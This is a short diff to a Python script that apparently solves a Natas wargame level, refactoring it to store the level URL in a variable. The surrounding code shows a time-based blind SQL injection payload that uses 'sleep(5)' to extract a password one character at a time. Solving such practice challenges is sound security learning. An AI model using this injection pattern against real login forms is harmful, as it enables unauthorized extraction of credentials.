@@ -12,6 +12,7 @@ def get_secret(debug=False):
     char_list = string.ascii_letters + string.digits
     password = ""
     req = get_request_object(level_number)
+    url = get_level_url(level_number)
 
     while True:
         if len(password) == password_length:
@@ -22,7 +23,7 @@ def get_secret(debug=False):
                 if debug:
                     print(f"checking: {password}{i}")
 
-                req.post(get_level_url(level_number), timeout=4,
+                req.post(url, timeout=4,
                          data={"username": f"natas16\" and password like binary '{password}{i}%' and sleep(5) #"})
             except requests.Timeout:
                 password += i
